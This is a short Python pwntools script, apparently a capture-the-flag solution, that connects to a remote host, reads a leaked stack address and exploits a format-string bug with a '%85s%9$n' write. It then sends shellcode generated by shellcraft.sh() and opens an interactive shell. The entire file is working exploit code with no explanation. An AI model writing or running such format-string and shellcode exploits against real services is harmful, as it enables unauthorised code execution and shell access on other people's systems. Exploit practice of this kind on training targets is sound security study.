from pwn import *
import re
context(arch="amd64",os="linux",log_level="debug")
p=remote("111.198.29.45",42278)
xx=p.recvuntil("name be:")
s_addr1=re.findall(r"is (.+?)\n",xx)[0]
s_addr=int("0x"+s_addr1,16)
p.sendline("abc")
p.sendlineafter("up?:","east")
p.sendlineafter("leave(0)?:","1")
p.sendlineafter("an address",str(s_addr))
p.recvuntil("wish is:")
payload="A"*8+".%p"*10
payload="%85s%9$n"+p64(s_addr)
p.sendline(payload)
p.recvuntil("YOU SPELL")
p.sendline(asm(shellcraft.sh()))
p.interactive()
